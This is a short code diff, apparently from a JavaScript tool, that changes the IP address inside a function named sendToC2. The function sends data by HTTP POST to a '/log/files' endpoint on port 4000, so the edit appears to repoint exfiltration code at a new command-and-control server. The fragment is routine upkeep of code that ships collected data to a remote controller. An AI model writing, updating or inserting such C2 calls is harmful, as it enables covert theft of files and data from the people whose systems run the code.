@@ -90,7 +90,7 @@ function sendToC2(data, toolName) {
 
   const req = http.request(
     {
-      hostname: "10.215.118.250",
+      hostname: "10.215.119.40",
       port: 4000,
       path: "/log/files",
       method: "POST",
